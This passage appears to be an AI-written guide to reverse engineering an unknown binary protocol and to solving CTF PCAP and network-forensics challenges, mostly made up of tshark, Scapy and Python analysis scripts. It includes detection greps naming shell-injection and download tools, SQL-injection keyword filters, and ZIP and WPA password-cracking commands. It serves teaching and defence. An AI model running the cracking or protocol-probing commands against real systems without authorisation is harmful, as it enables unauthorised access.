[Unverified] This is based on reverse engineering and may require adjustments.
"""

import socket
import struct
import hashlib
import os

class UnknownProtocolClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.sequence = 0
        self.session_token = None
        self.auth_token = None
        
    def connect(self):
        """Establish TCP connection and send HELLO."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        
        # Generate random client ID
        client_id = int.from_bytes(os.urandom(4), 'big')
        
        # Build HELLO message
        payload = struct.pack('>I', client_id)  # Client ID
        payload += struct.pack('>H', 1)          # Protocol version
        payload += b'\x00' * 16                   # Empty session token
        
        self._send_message(0x01, payload)
        
        # Receive HELLO_ACK
        response = self._recv_message()
        if response['msgtype'] == 0x02:
            self.session_token = response['payload'][:16]
            print(f"Connected. Session token: {self.session_token.hex()}")
            return True
        return False
    
    def authenticate(self, username, password):
        """Authenticate with username and password."""
        # Hash password
        password_hash = hashlib.sha256(password.encode()).digest()
        
        # Build AUTH_REQUEST
        payload = struct.pack('B', 0x01)  # Method: password
        payload += struct.pack('B', len(username))
        payload += username.encode('utf-8')
        payload += struct.pack('B', len(password_hash))
        payload += password_hash
        
        self._send_message(0x03, payload)
        
        # Receive response
        response = self._recv_message()
        if response['msgtype'] == 0x04:  # AUTH_SUCCESS
            self.auth_token = response['payload'][:32]
            print("Authentication successful")
            return True
        else:
            print("Authentication failed")
            return False
    
    def send_data(self, data, data_type=0x01):
        """Send DATA message."""
        payload = struct.pack('B', data_type)  # Data type
        payload += struct.pack('B', 0x00)       # Flags
        payload += data
        
        self._send_message(0x10, payload)
    
    def recv_data(self):
        """Receive DATA message."""
        response = self._recv_message()
        if response['msgtype'] == 0x10:
            data_type = response['payload'][0]
            flags = response['payload'][1]
            data = response['payload'][2:]
            return {'type': data_type, 'flags': flags, 'data': data}
        return None
    
    def close(self):
        """Send CLOSE and terminate connection."""
        self._send_message(0xFF, b'')
        self.sock.close()
    
    def _send_message(self, msgtype, payload):
        """Send message with protocol header."""
        header = struct.pack('B', 0x01)  # Version
        header += struct.pack('B', msgtype)
        header += struct.pack('>H', len(payload))
        header += struct.pack('>I', self.sequence)
        
        self.sock.send(header + payload)
        self.sequence += 1
    
    def _recv_message(self):
        """Receive and parse message."""
        # Receive header
        header = self._recv_exact(8)
        version, msgtype, length, seqnum = struct.unpack('>BBHI', header)
        
        # Receive payload
        payload = self._recv_exact(length) if length > 0 else b''
        
        return {
            'version': version,
            'msgtype': msgtype,
            'length': length,
            'seqnum': seqnum,
            'payload': payload
        }
    
    def _recv_exact(self, n):
        """Receive exactly n bytes."""
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data


# Usage example
if __name__ == '__main__':
    client = UnknownProtocolClient('target.example.com', 9999)
    
    try:
        if client.connect():
            if client.authenticate('admin', 'password123'):
                client.send_data(b'Hello, server!')
                response = client.recv_data()
                if response:
                    print(f"Received: {response['data']}")
    finally:
        client.close()
``

### Scapy Integration

```python
from scapy.all import *

class UnknownProto(Packet):
    name = "UnknownProtocol"
    fields_desc = [
        ByteField("version", 1),
        ByteEnumField("msgtype", 0, {
            0x01: "HELLO",
            0x02: "HELLO_ACK",
            0x03: "AUTH_REQUEST",
            0x04: "AUTH_SUCCESS",
            0x05: "AUTH_FAILURE",
            0x10: "DATA",
            0xFF: "CLOSE"
        }),
        ShortField("length", None),
        IntField("seqnum", 0),
        StrLenField("payload", "", length_from=lambda pkt: pkt.length)
    ]
    
    def post_build(self, p, pay):
        # Auto-calculate length if not set
        if self.length is None:
            length = len(self.payload)
            p = p[:2] + struct.pack('>H', length) + p[4:]
        return p + pay

# Bind to TCP port
bind_layers(TCP, UnknownProto, dport=9999)
bind_layers(TCP, UnknownProto, sport=9999)

# Example: Craft and send HELLO
pkt = IP(dst="target.example.com")/TCP(dport=9999)/UnknownProto(
    msgtype=0x01,
    payload=struct.pack('>IH', 0x12345678, 1) + b'\x00'*16
)
send(pkt)
``

## Analysis Tools and Scripts

### Bulk Traffic Analysis

```bash
#!/bin/bash
# analyze_protocol.sh - Automated protocol analysis pipeline

PCAP_FILE="$1"
OUTPUT_DIR="analysis_output"

mkdir -p "$OUTPUT_DIR"

echo "[+] Extracting protocol statistics..."
tshark -r "$PCAP_FILE" -q -z io,phs > "$OUTPUT_DIR/protocol_hierarchy.txt"

echo "[+] Analyzing message types..."
python3 extract_message_types.py "$PCAP_FILE" > "$OUTPUT_DIR/message_types.txt"

echo "[+] Building state machine..."
python3 analyze_message_sequences.py "$PCAP_FILE" > "$OUTPUT_DIR/sequences.txt"

echo "[+] Detecting length fields..."
for stream in $(tshark -r "$PCAP_FILE" -T fields -e tcp.stream | sort -u); do
    tshark -r "$PCAP_FILE" -Y "tcp.stream == $stream" \
        -T fields -e tcp.payload | xxd -r -p > "$OUTPUT_DIR/stream_${stream}.bin"
    python3 length_analyzer.py "$OUTPUT_DIR/stream_${stream}.bin" \
        >> "$OUTPUT_DIR/length_analysis.txt"
done

echo "[+] Generating state machine diagram..."
python3 generate_state_diagram.py "$PCAP_FILE" > "$OUTPUT_DIR/state_machine.dot"
dot -Tpng "$OUTPUT_DIR/state_machine.dot" -o "$OUTPUT_DIR/state_machine.png"

echo "[+] Analysis complete. Results in $OUTPUT_DIR/"
``

## Appendix

### Common Pitfalls

1. **Endianness Assumptions**:
    
    - Always test both big-endian and little-endian interpretations
    - Network protocols typically use big-endian, but not always
2. **Variable-Length Fields**:
    
    - Don't assume fixed positions for fields after variable-length data
    - Track offset dynamically during parsing
3. **State Dependency**:
    
    - Some fields may only appear in specific states
    - Message structure can vary based on negotiated capabilities
4. **Incomplete Captures**:
    
    - Packet loss may make sequences appear invalid
    - Filter for complete TCP streams before analysis

### Verification Checklist

- [ ] Length field interpretation validated across multiple packets
- [ ] Message type values confirmed with at least 3 examples each
- [ ] State transitions tested with active connections
- [ ] Edge cases documented (errors, timeouts, malformed messages)
- [ ] Wireshark dissector successfully parses all test captures
- [ ] Client implementation successfully communicates with server
- [ ] All [Inference] and [Unverified] tags appropriately placed

### Related Topics for Further Study

- **Protocol Fuzzing**: Test edge cases and trigger error states systematically
- **Encrypted Protocol Analysis**: Techniques when payload is encrypted but metadata visible
- **Binary Protocol Code Generation**: Automated parser generation from specifications
- **Protocol Fingerprinting**: Identifying protocol versions and implementations from traffic patterns
```

This documentation template provides comprehensive coverage while clearly labeling all unverified claims and inferences per your requirements.

---

# CTF Challenge Types

## PCAP Analysis Challenges

PCAP analysis challenges provide pre-captured network traffic files requiring examination to extract flags, identify malicious activity, reconstruct communications, or uncover hidden data. These challenges test fundamental packet analysis skills, protocol knowledge, and investigative methodology essential for network security practitioners.

### Challenge Structure and Objectives

**Common flag hiding techniques:**

- Embedded in protocol fields (custom headers, options, padding)
- Encoded within payload data (Base64, hex, XOR, custom encoding)
- Split across multiple packets requiring reassembly
- Hidden in timing patterns or packet ordering
- Concealed in malformed or non-standard protocol implementations
- Embedded in extracted files or objects from network streams

**Typical challenge scenarios:**

- **Data exfiltration detection**: Identify covert channels or unusual data transfers
- **Protocol analysis**: Decode proprietary or obfuscated protocols
- **Stream reconstruction**: Reassemble fragmented communications
- **Malware behavior analysis**: Identify C2 traffic patterns and payloads
- **Cryptographic challenges**: Extract keys, identify cipher implementations, or exploit weak cryptography
- **Steganography**: Discover data hidden within legitimate traffic

### Initial Reconnaissance Workflow

```bash
# File identification and basic statistics
file capture.pcap
capinfos capture.pcap

# Output provides:
# - File type and encapsulation
# - Capture duration and packet count
# - Data rate statistics
# - Interface information

# Quick protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Conversation statistics
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z conv,udp
tshark -r capture.pcap -q -z conv,ip

# Identify unique hosts
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | \
  tr '\t' '\n' | sort -u

# Protocol distribution
tshark -r capture.pcap -T fields -e _ws.col.Protocol | \
  sort | uniq -c | sort -rn
```

**Wireshark Statistics Menu reconnaissance:**

- Statistics → Protocol Hierarchy: Visual protocol breakdown
- Statistics → Conversations: Connection pairs with byte counts
- Statistics → Endpoints: Individual host statistics
- Statistics → I/O Graph: Temporal traffic visualization
- Statistics → Flow Graph: Sequence diagram of packet flows

### HTTP/HTTPS Analysis Challenges

HTTP traffic frequently contains flags in URLs, headers, POST data, or transferred files.

```bash
# Extract all HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields \
  -e frame.number -e ip.src -e http.request.method \
  -e http.host -e http.request.uri

# Display HTTP response codes
tshark -r capture.pcap -Y "http.response" -T fields \
  -e frame.number -e http.response.code -e http.response.phrase

# Extract User-Agent strings (potential exfiltration channel)
tshark -r capture.pcap -Y "http.request" -T fields \
  -e http.user_agent | sort -u

# Extract all HTTP headers
tshark -r capture.pcap -Y "http" -T fields -e http.request.line \
  -e http.response.line -e http.header

# Export HTTP objects (files)
tshark -r capture.pcap --export-objects http,./http_objects/

# Alternative in Wireshark GUI:
# File → Export Objects → HTTP
```

**Common HTTP challenge patterns:**

```bash
# Base64 encoded data in URLs or headers
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri | \
  grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | \
  while read encoded; do echo "$encoded" | base64 -d 2>/dev/null; done

# POST data analysis
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data | xxd -r -p

# Custom headers containing flags
tshark -r capture.pcap -Y "http" -T fields -e http.header | \
  grep -i "x-flag\|x-custom\|x-secret"

# Cookie analysis
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
```

**HTTPS/TLS challenges:**

[Inference] Without private keys, HTTPS payload analysis is limited to metadata examination, though misconfigurations or provided keys may enable decryption.

```bash
# TLS handshake analysis
tshark -r capture.pcap -Y "ssl.handshake" -T fields \
  -e frame.number -e ip.src -e ip.dst \
  -e ssl.handshake.type -e ssl.handshake.version

# Extract SNI (Server Name Indication)
tshark -r capture.pcap -Y "ssl.handshake.type == 1" \
  -T fields -e ssl.handshake.extensions_server_name

# Certificate extraction
tshark -r capture.pcap -Y "ssl.handshake.certificate" \
  --export-objects "ssl,./ssl_certs/"

# Decrypt with provided key (RSA)
# Edit → Preferences → Protocols → TLS → RSA keys list
# Or command line:
tshark -r capture.pcap -o "tls.keys_list:0.0.0.0,443,http,server.key" \
  -Y "http" --export-objects http,./decrypted_objects/
```

### DNS Analysis Challenges

DNS often serves as a covert channel for data exfiltration or flag transmission.

```bash
# All DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e frame.time -e ip.src -e dns.qry.name

# DNS responses with answers
tshark -r capture.pcap -Y "dns.flags.response == 1 and dns.count.answers > 0" \
  -T fields -e dns.qry.name -e dns.a -e dns.aaaa

# Unusual query types
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.type | \
  sort | uniq -c | sort -rn

# TXT record analysis (common exfiltration method)
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.txt

# Long subdomain queries (potential data encoding)
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | \
  awk 'length($0) > 50'

# Extract subdomain components for decoding
tshark -r capture.pcap -Y "dns.qry.name contains \"exfil.example.com\"" \
  -T fields -e dns.qry.name | \
  sed 's/\.exfil\.example\.com$//' | \
  tr '.' '\n'
```

**DNS tunneling detection:**

```bash
# High query frequency to single domain
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | \
  awk -F. '{print $(NF-1)"."$NF}' | \
  sort | uniq -c | sort -rn | head -20

# Entropy analysis of subdomains (random = potential encoding)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
  python3 -c "
import sys
import math
from collections import Counter

for line in sys.stdin:
    subdomain = line.strip().split('.')[0]
    if len(subdomain) > 10:
        freq = Counter(subdomain)
        entropy = -sum(count/len(subdomain) * math.log2(count/len(subdomain)) 
                      for count in freq.values())
        if entropy > 3.5:  # High entropy threshold
            print(f'{entropy:.2f}: {line.strip()}')
"
```

### TCP Stream Reconstruction

TCP streams often contain complete application-layer communications requiring reassembly.

```bash
# Follow TCP stream (command line)
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Follow specific stream by index
tshark -r capture.pcap -q -z follow,tcp,ascii,5

# Extract all TCP streams to files
tshark -r capture.pcap -Y "tcp" -T fields -e tcp.stream | \
  sort -u | \
  while read stream; do
    tshark -r capture.pcap -q -z follow,tcp,raw,$stream > stream_$stream.raw
  done

# Identify streams by port
tshark -r capture.pcap -Y "tcp.port == 1234" -T fields -e tcp.stream | \
  sort -u
```

**Wireshark stream following:** Right-click packet → Follow → TCP Stream (Ctrl+Alt+Shift+T)

Stream window options:

- Entire conversation / Client to server / Server to client
- ASCII / EBCDIC / Hex Dump / C Arrays / Raw
- Find within stream
- Save stream content

**FTP session reconstruction:**

```bash
# FTP commands
tshark -r capture.pcap -Y "ftp" -T fields \
  -e frame.time -e ip.src -e ftp.request.command \
  -e ftp.request.arg -e ftp.response.code

# FTP-DATA extraction (passive mode)
# Identify data connection from PORT/PASV commands
tshark -r capture.pcap -Y "ftp.request.command == PASV"

# Extract transferred file from data connection
tshark -r capture.pcap -Y "tcp.port == 20 or ftp-data" \
  -T fields -e tcp.payload | \
  xxd -r -p > transferred_file.bin
```

**Telnet/SSH session analysis:**

```bash
# Telnet keystrokes (cleartext)
tshark -r capture.pcap -Y "telnet" -T fields -e telnet.data | \
  xxd -r -p

# SSH session metadata (no plaintext without keys)
tshark -r capture.pcap -Y "ssh" -T fields \
  -e frame.time -e ip.src -e ip.dst \
  -e ssh.protocol -e ssh.message_code
```

### ICMP Covert Channels

ICMP packets can carry flags in payload data or timing patterns.

```bash
# ICMP echo requests/replies
tshark -r capture.pcap -Y "icmp" -T fields \
  -e frame.number -e ip.src -e ip.dst \
  -e icmp.type -e icmp.code -e data.data

# Extract ICMP payload data
tshark -r capture.pcap -Y "icmp.type == 8 or icmp.type == 0" \
  -T fields -e data.data | \
  xxd -r -p

# ICMP payload hex dump
tshark -r capture.pcap -Y "icmp" -x | \
  grep -A 10 "0030\|0040" | \
  grep -v "^\-\-$"

# Timing analysis (covert channel)
tshark -r capture.pcap -Y "icmp.type == 8" \
  -T fields -e frame.time_relative -e ip.src | \
  awk '{print $1}' | \
  awk 'NR>1{print $1-prev} {prev=$1}'
```

**ICMP tunneling detection:**

```bash
# Unusual payload sizes
tshark -r capture.pcap -Y "icmp" -T fields \
  -e frame.len | sort | uniq -c | sort -rn

# Non-standard payload patterns
tshark -r capture.pcap -Y "icmp.type == 8" \
  -T fields -e data.data | \
  grep -v "^[0]*$"  # Filter out all-zero padding
```

### File Extraction and Carving

```bash
# Automated object export
tshark -r capture.pcap --export-objects http,./http_extracted/
tshark -r capture.pcap --export-objects smb,./smb_extracted/
tshark -r capture.pcap --export-objects tftp,./tftp_extracted/
tshark -r capture.pcap --export-objects dicom,./dicom_extracted/

# Manual file carving with binwalk
tcpflow -r capture.pcap -o tcpflow_output/
binwalk -e tcpflow_output/*

# Foremost for comprehensive carving
foremost -i capture.pcap -o foremost_output/

# Scalpel with custom signatures
scalpel capture.pcap -o scalpel_output/

# Extract specific file by magic bytes
tshark -r capture.pcap -T fields -e data.data | \
  xxd -r -p | \
  strings -n 10 | \
  grep -A 5 "PNG\|JFIF\|PDF"
```

**ZIP/Archive analysis:**

```bash
# Extract and examine archives
unzip extracted_file.zip
zipinfo -v extracted_file.zip

# Password-protected archives (brute force)
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt extracted.zip

# Examine archive metadata
exiftool extracted_file.zip
```

### USB Traffic Analysis

USB PCAP captures contain HID (keyboard/mouse) and mass storage device interactions.

```bash
# USB device enumeration
tshark -r usb_capture.pcap -Y "usb.bmRequestType == 0x80" \
  -T fields -e usb.device_address -e usb.idVendor -e usb.idProduct

# USB HID keyboard data extraction
tshark -r usb_capture.pcap -Y "usb.transfer_type == 0x01" \
  -T fields -e usb.capdata

# Decode keyboard scan codes
tshark -r usb_capture.pcap -Y "usb.transfer_type == 0x01" \
  -T fields -e usb.capdata | \
  python3 << 'EOF'
import sys

# USB HID keyboard scan code mapping
keymap = {
    0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd', 0x08: 'e',
    0x09: 'f', 0x0a: 'g', 0x0b: 'h', 0x0c: 'i', 0x0d: 'j',
    0x0e: 'k', 0x0f: 'l', 0x10: 'm', 0x11: 'n', 0x12: 'o',
    0x13: 'p', 0x14: 'q', 0x15: 'r', 0x16: 's', 0x17: 't',
    0x18: 'u', 0x19: 'v', 0x1a: 'w', 0x1b: 'x', 0x1c: 'y',
    0x1d: 'z', 0x1e: '1', 0x1f: '2', 0x20: '3', 0x21: '4',
    0x22: '5', 0x23: '6', 0x24: '7', 0x25: '8', 0x26: '9',
    0x27: '0', 0x28: '\n', 0x2c: ' '
}

for line in sys.stdin:
    data = line.strip()
    if len(data) == 16:  # 8 bytes = 16 hex chars
        modifier = int(data[0:2], 16)
        keycode = int(data[4:6], 16)
        if keycode in keymap:
            char = keymap[keycode]
            if modifier & 0x02:  # Shift pressed
                char = char.upper()
            print(char, end='')
EOF
```

**USB mass storage:**

```bash
# Extract USB bulk transfer data
tshark -r usb_capture.pcap -Y "usb.transfer_type == 0x03" \
  -T fields -e usb.capdata | \
  xxd -r -p > usb_data.bin

# Analyze for filesystems
file usb_data.bin
binwalk usb_data.bin
```

### Wireless (802.11) Challenges

[Unverified] Wireless captures may contain WPA handshakes, beacon frames with hidden SSIDs, or deauthentication attacks requiring specialized analysis.

```bash
# Wireless statistics
tshark -r wifi_capture.pcap -q -z wlan,stat

# Extract SSIDs
tshark -r wifi_capture.pcap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.ssid | sort -u

# Identify access points
tshark -r wifi_capture.pcap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.bssid -e wlan.ssid -e wlan_radio.channel | \
  sort -u

# Extract WPA handshake
tshark -r wifi_capture.pcap -Y "eapol" -w handshake.pcap

# Crack WPA handshake with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.pcap
```

### Scapy for Custom Protocol Analysis

When standard tools fail, Scapy enables custom packet manipulation and analysis.

```python
#!/usr/bin/env python3
from scapy.all import *

# Load PCAP
packets = rdpcap('capture.pcap')

# Analyze custom protocol
for pkt in packets:
    if Raw in pkt:
        payload = pkt[Raw].load
        # Custom decoding logic
        if payload.startswith(b'\x42\x42'):  # Magic bytes
            decoded = payload[2:].decode('utf-8', errors='ignore')
            print(f"Found custom protocol: {decoded}")

# Extract flags from specific offsets
flags = []
for pkt in packets:
    if TCP in pkt and pkt[TCP].dport == 1337:
        if Raw in pkt:
            data = pkt[Raw].load
            if len(data) > 20:
                flags.append(data[16:20])  # Extract bytes 16-19

print(b''.join(flags))
```

**Scapy advanced filtering:**

```python
# Filter by multiple conditions
interesting_packets = [pkt for pkt in packets 
                       if TCP in pkt 
                       and pkt[TCP].flags & 0x08  # PSH flag
                       and len(pkt) > 100]

# Statistical analysis
packet_sizes = [len(pkt) for pkt in packets]
print(f"Mean: {sum(packet_sizes)/len(packet_sizes):.2f}")
print(f"Max: {max(packet_sizes)}")

# Protocol layer analysis
for pkt in packets:
    layers = []
    layer = pkt
    while layer:
        layers.append(layer.name)
        layer = layer.payload if hasattr(layer, 'payload') else None
    print(' / '.join(layers))
```

### Encoding and Obfuscation Patterns

```bash
# Identify Base64 in payloads
tshark -r capture.pcap -T fields -e data.data | \
  xxd -r -p | strings | \
  grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | \
  while read b64; do
    decoded=$(echo "$b64" | base64 -d 2>/dev/null)
    if [ $? -eq 0 ]; then
      echo "Found: $decoded"
    fi
  done

# Hex encoded strings
tshark -r capture.pcap -T fields -e data.data | \
  xxd -r -p | strings | \
  grep -oP '([0-9a-fA-F]{2})+' | \
  xxd -r -p

# ROT13/Caesar cipher
tshark -r capture.pcap -T fields -e data.data | \
  xxd -r -p | strings | \
  tr 'A-Za-z' 'N-ZA-Mn-za-m'

# XOR with common keys
tshark -r capture.pcap -T fields -e data.data | \
  xxd -r -p | \
  python3 -c "
import sys
data = sys.stdin.buffer.read()
for key in [0x42, 0xFF, 0xAA, 0x55]:
    decoded = bytes(b ^ key for b in data)
    print(f'Key {key:02x}: {decoded[:50]}')
"
```

### Challenge Solution Workflow

**Systematic approach:**

1. **Initial triage**: File type, size, duration, packet count
2. **Protocol identification**: What protocols are present?
3. **Endpoint analysis**: Who is talking to whom?
4. **Temporal analysis**: When did significant events occur?
5. **Content extraction**: Export objects, streams, payloads
6. **Decoding attempts**: Base64, hex, compression, encryption
7. **Pattern recognition**: Repeated sequences, anomalies, outliers
8. **Reassembly**: Reconstruct fragmented data
9. **Validation**: Verify flag format, test solutions

**Common mistakes to avoid:**

- Analyzing wrong stream or conversation
- Missing multi-part flags across packets
- Incorrect byte order (endianness)
- Forgetting to decode multiple encoding layers
- Overlooking metadata (timestamps, sequence numbers)
- Not checking packet options/padding for hidden data

### Tools and Scripts Repository

```bash
# Extract all unique payload patterns
tshark -r capture.pcap -T fields -e data.data | \
  sort -u > unique_payloads.txt

# Find packets with specific byte sequences
tshark -r capture.pcap -Y "data.data contains 66:6c:61:67"  # "flag" hex

# Statistical outlier detection
tshark -r capture.pcap -T fields -e frame.len | \
  python3 -c "
import sys
import statistics
lengths = [int(line.strip()) for line in sys.stdin if line.strip()]
mean = statistics.mean(lengths)
stdev = statistics.stdev(lengths)
threshold = mean + (3 * stdev)
print(f'Packets larger than {threshold:.0f} bytes are outliers')
"

# Timeline generation
tshark -r capture.pcap -T fields \
  -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol \
  -E header=y -E separator=, > timeline.csv
```

---

## Network Forensics Scenarios

Network forensics challenges simulate incident response situations requiring investigation of security breaches, data exfiltration, malware infections, or policy violations. These scenarios demand systematic evidence collection, timeline reconstruction, attribution analysis, and comprehensive reporting of findings.

### Incident Response Methodology

**Standard forensic workflow:**

1. **Identification**: Recognize security incident indicators
2. **Preservation**: Create forensically sound copies, document chain of custody
3. **Collection**: Gather relevant network traffic, logs, and artifacts
4. **Analysis**: Examine evidence for indicators of compromise (IOCs)
5. **Documentation**: Record findings with timestamps and evidence references
6. **Reporting**: Summarize incident timeline, impact, and recommendations

**Forensic PCAP handling:**

```bash
# Create forensic copy with hash verification
sha256sum original_capture.pcap > original.sha256
cp --preserve=all original_capture.pcap evidence_001.pcap
sha256sum -c original.sha256

# Document metadata
capinfos -T evidence_001.pcap > evidence_001_metadata.txt
echo "Collection date: $(date)" >> evidence_001_metadata.txt
echo "Analyst: $(whoami)" >> evidence_001_metadata.txt
echo "Case ID: INC-2025-1020" >> evidence_001_metadata.txt

# Write-protect evidence
chmod 444 evidence_001.pcap
```

### Intrusion Detection Analysis

**Identifying attack patterns:**

```bash
# Port scanning detection
tshark -r evidence.pcap -q -z conv,tcp | \
  awk 'NR>5 {print $1, $6}' | \
  awk '{count[$1]++} END {for(ip in count) if(count[ip]>50) print ip, count[ip]}' | \
  sort -k2 -rn

# SYN flood identification
tshark -r evidence.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" \
  -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Failed connection attempts
tshark -r evidence.pcap -Y "tcp.flags.reset==1" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport

# Unusual protocols on standard ports
tshark -r evidence.pcap -Y "tcp.port == 80 and not http" \
  -T fields -e frame.number -e ip.src -e ip.dst

# High packet rate sources (potential DDoS)
tshark -r evidence.pcap -T fields -e frame.time_relative -e ip.src | \
  awk '{print int($1), $2}' | sort | uniq -c | sort -k1 -rn | head -20
```

**SQL injection detection:**

```bash
# HTTP requests with SQL keywords
tshark -r evidence.pcap -Y "http.request.uri" -T fields \
  -e frame.time -e ip.src -e http.request.uri | \
  grep -iE "select|union|insert|update|delete|drop|exec|script"

# POST data with injection attempts
tshark -r evidence.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data | \
  xxd -r -p | \
  grep -iE "'|--|/\*|union|xp_cmdshell"
```

**Command injection patterns:**

```bash
# Shell command indicators in HTTP
tshark -r evidence.pcap -Y "http" -T fields \
  -e http.request.uri -e http.file_data | \
  grep -E ";|\||&|`|\$\(|wget|curl|bash|sh|cmd\.exe"
```

### Malware Traffic Analysis

**C2 (Command and Control) identification:**

```bash
# Beaconing detection (regular intervals)
tshark -r evidence.pcap -Y "tcp" -T fields \
  -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport | \
  awk '{print $1, $2, $3, $4}' | \
  python3 << 'EOF'
import sys
from collections import defaultdict
from statistics import stdev, mean

connections = defaultdict(list)
for line in sys.stdin:
    parts = line.strip().split()
    if len(parts) == 4:
        time, src, dst, port = parts
        key = f"{src}->{dst}:{port}"
        connections[key].append(float(time))

for conn, times in connections.items():
    if len(times) > 5:
        intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
        if intervals and stdev(intervals) < 5:  # Consistent timing
            print(f"Potential beaconing: {conn}")
            print(f"  Mean interval: {mean(intervals):.2f}s, StdDev: {stdev(intervals):.2f}s")
EOF

# DNS tunneling indicators
tshark -r evidence.pcap -Y "dns.qry.name" -T fields \
  -e dns.qry.name | \
  awk 'length($0) > 50' | \
  while read domain; do
    entropy=$(echo "$domain" | python3 -c "
import sys, math
from collections import Counter
s = sys.stdin.read().strip()
freq = Counter(s)
entropy = -sum(count/len(s) * math.log2(count/len(s)) for count in freq.values())
print(entropy)
")
    if (( $(echo "$entropy > 3.5" | bc -l) )); then
      echo "$entropy $domain"
    fi
  done

# Suspicious user agents
tshark -r evidence.pcap -Y "http.request" -T fields \
  -e http.user_agent | sort -u | \
  grep -vE "Mozilla|Chrome|Safari|Edge|Opera"

# Encrypted C2 over unusual ports
tshark -r evidence.pcap -Y "tcp and not (tcp.port == 443 or tcp.port == 22)" \
  -T fields -e tcp.dstport -e data.data | \
  python3 << 'EOF'
import sys
for line in sys.stdin:
    parts = line.strip().split('\t')
    if len(parts) == 2:
        port, data = parts
        if len(data) > 20:
            # Check for high entropy (potential encryption)
            byte_freq = {}
            for i in range(0, len(data), 2):
                byte = data[i:i+2]
                byte_freq[byte] = byte_freq.get(byte, 0) + 1
            unique_ratio = len(byte_freq) / (len(data) / 2)
            if unique_ratio > 0.7:  # High byte diversity
                print(f"Port {port}: High entropy traffic (potential encryption)")
                break
EOF
```

**Malware download identification:**

```bash
# Executable downloads
tshark -r evidence.pcap --export-objects http,./downloads/
file ./downloads/* | grep -E "PE32|ELF|Mach-O"

# Suspicious download patterns
tshark -r evidence.pcap -Y "http.response and http.content_type contains \"application\"" \
  -T fields -e frame.time -e ip.src -e http.request.uri \
  -e http.content_type -e http.content_length

# Base64 encoded payloads (common in PowerShell attacks)
tshark -r evidence.pcap -Y "http" -T fields -e http.file_data | \
  xxd -r -p | strings | \
  grep -oP "(?:powershell|pwsh).{0,50}[A-Za-z0-9+/]{50,}={0,2}"
```

### Data Exfiltration Detection

**Large outbound transfers:**

```bash
# Top data senders
tshark -r evidence.pcap -q -z conv,tcp | \
  awk 'NR>5 && $1 ~ /^[0-9]/ {print $1, $9}' | \
  sort -k2 -rn | head -20

# Outbound connections with large payloads
tshark -r evidence.pcap -Y "tcp.len > 1000" \
  -T fields -e ip.src -e ip.dst -e tcp.len | \
  awk '{bytes[$1]+=$ 3} END {for(ip in bytes) print ip, bytes[ip]}' | \
  sort -k2 -rn

# Upload activity (POST requests with large bodies)
tshark -r evidence.pcap -Y "http.request.method == POST" \
  -T fields -e frame.time -e ip.src -e http.host \
  -e http.content_length | \
  awk '$4 > 10000'

# Outbound FTP transfers
tshark -r evidence.pcap -Y "ftp.request.command == STOR" \
  -T fields -e frame.time -e ip.src -e ftp.request.arg

# Unusual outbound ports
tshark -r evidence.pcap -Y "ip.src == 192.168.1.100" \
  -T fields -e tcp.dstport -e udp.dstport | \
  tr '\t' '\n' | grep -v "^$" | sort | uniq -c | sort -rn
````

**Exfiltration channel analysis:**

```bash
# Email exfiltration (SMTP)
tshark -r evidence.pcap -Y "smtp.data.fragment" \
  -T fields -e frame.time -e ip.src -e smtp.req.parameter

# Reconstruct email content
tshark -r evidence.pcap -Y "smtp" -q -z follow,tcp,ascii,<stream_number>

# Cloud storage uploads (OAuth tokens, API keys)
tshark -r evidence.pcap -Y "http" -T fields \
  -e http.request.uri -e http.authorization | \
  grep -iE "dropbox|drive\.google|onedrive|s3\.amazonaws"

# Pastebin/file sharing services
tshark -r evidence.pcap -Y "http.host" -T fields -e http.host | \
  sort -u | grep -iE "pastebin|ghostbin|file\.io|transfer\.sh"
````

**Steganography detection:**

```bash
# Extract images for steganalysis
tshark -r evidence.pcap --export-objects http,./images/
find ./images -type f -exec file {} \; | grep -iE "JPEG|PNG|GIF"

# Analyze image metadata
exiftool ./images/* | grep -A 5 "Comment"

# Steganalysis tools
stegdetect ./images/*.jpg
zsteg ./images/*.png
steghide info ./images/suspicious.jpg
```

### Timeline Reconstruction

**Comprehensive event timeline:**

```bash
# Generate detailed timeline
tshark -r evidence.pcap -T fields \
  -e frame.number \
  -e frame.time \
  -e ip.src \
  -e ip.dst \
  -e _ws.col.Protocol \
  -e tcp.srcport \
  -e tcp.dstport \
  -e udp.srcport \
  -e udp.dstport \
  -e frame.len \
  -e _ws.col.Info \
  -E header=y -E separator="|" -E quote=d > timeline.csv

# Convert to human-readable format
cat timeline.csv | column -t -s "|" | less

# Critical events extraction
tshark -r evidence.pcap -Y "http.request or dns or ftp" \
